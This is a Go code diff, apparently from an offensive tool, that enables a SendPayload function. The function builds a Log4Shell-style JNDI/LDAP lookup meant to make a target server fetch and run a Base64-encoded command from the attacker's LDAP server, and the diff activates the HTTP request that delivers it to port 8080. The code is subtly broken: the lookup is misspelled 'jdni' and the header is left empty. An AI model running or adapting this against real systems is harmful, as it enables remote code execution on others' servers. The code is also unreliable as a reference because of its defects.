@@ -5,10 +5,12 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"net/http"
 	"os/exec"
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/gin-contrib/cors"
 	"github.com/gin-gonic/gin"
@@ -176,19 +178,19 @@ func SendPayload(payload string, targetip string) (string, error) {
 	}
 	target := targetip + ":8080"
 	reqPayload := "${jdni:ldap://" + intIP.String() + ":1389/Basic/Command/Base64/" + payload + "}"
-	// req, err := http.NewRequest("GET", "http://"+target+"/", nil)
-	// req.Header.Add("X-Api-Version", "")
-	// if err != nil {
-	// 	return "", err
-	// }
-	// client := &http.Client{
-	// 	Timeout: 5 * time.Second,
-	// }
-	// resp, err := client.Do(req)
-	// if err != nil {
-	// 	return "", err
-	// }
-	// defer resp.Body.Close()
+	req, err := http.NewRequest("GET", "http://"+target+"/", nil)
+	req.Header.Add("X-Api-Version", "")
+	if err != nil {
+		return "", err
+	}
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
 	return "Payload sent to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload, nil
 }
 
